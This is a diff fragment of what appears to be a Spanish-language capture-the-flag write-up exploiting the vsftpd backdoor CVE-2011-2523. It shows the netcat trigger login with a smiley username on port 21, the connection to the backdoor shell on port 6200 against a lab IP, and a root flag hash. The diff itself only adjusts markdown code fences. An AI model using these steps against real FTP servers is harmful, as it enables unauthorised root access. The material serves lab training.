@@ -16,10 +16,12 @@ La version de vsftpd es vulnerable a la **CVE-2011-2523**, una puerta trasera (b
 nc 172.17.0.2 21
 USER user:)
 PASS x
+```
 
 **Conexion a la shell (terminal 2):**
-bash
+bash```
 nc 172.17.0.2 6200
+```
 
 **🚩Flag:**
 root.txt: `261fd3f32200f950f231816b4e9a0594`
